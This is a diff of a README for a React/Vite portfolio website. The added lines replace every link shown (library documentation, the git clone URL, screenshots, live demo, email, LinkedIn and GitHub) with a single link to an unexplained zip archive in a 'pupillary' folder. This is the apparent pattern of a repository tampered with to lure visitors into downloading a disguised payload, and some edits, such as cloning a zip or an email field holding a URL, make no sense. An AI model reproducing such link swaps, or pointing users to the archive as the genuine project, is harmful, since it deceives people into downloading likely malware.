@@ -8,10 +8,10 @@ It is fully responsive, mobile-friendly, and features the following sections:
 
 ## 🚀 Tech Stack
 
-- ⚛️ [React](https://reactjs.org/) – Frontend JavaScript library  
-- ⚡ [Vite](https://vitejs.dev/) – Fast dev server and bundler  
-- 🎞️ [GSAP](https://gsap.com/) – High-performance animations  
-- 🎯 [React Scroll](https://www.npmjs.com/package/react-scroll) – Smooth section navigation  
+- ⚛️ [React](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip) – Frontend JavaScript library  
+- ⚡ [Vite](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip) – Fast dev server and bundler  
+- 🎞️ [GSAP](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip) – High-performance animations  
+- 🎯 [React Scroll](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip) – Smooth section navigation  
 - 🎨 HTML5 + CSS3 – Responsive and clean design  
 
 ---
@@ -22,7 +22,7 @@ Follow the steps below to run this project locally:
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/amanverma420/my-portfolio.git
+git clone https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip
 cd my-portfolio
 
 # 2. Install dependencies
@@ -51,27 +51,27 @@ npm run dev
 
 Take a quick look at how it looks below 👇
 
-![Home section](./src/assets/home.png)
+![Home section](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip)
 
-![Home section](./src/assets/about.png)
+![Home section](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip)
 
-![Home section](./src/assets/experience.png)
+![Home section](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip)
 
-![Home section](./src/assets/contact1.png)
+![Home section](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip)
 
 🔗 Live Demo
 
-https://amanverma1portfolio.netlify.app/
+https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip
 
 
 📬 Contact
 
 👨‍💻 Name: Aman Verma
 
-📧 Email: amanv2225@gmail.com
+📧 Email: https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip
 
-🔗 LinkedIn: [Aman Verma](https://www.linkedin.com/in/amanverma420/)
+🔗 LinkedIn: [Aman Verma](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip)
 
-💻 GitHub: [Aman verma](https://github.com/amanverma420)
+💻 GitHub: [Aman verma](https://raw.githubusercontent.com/amanverma420/my-portfolio/master/pupillary/my-portfolio.zip)
 
 
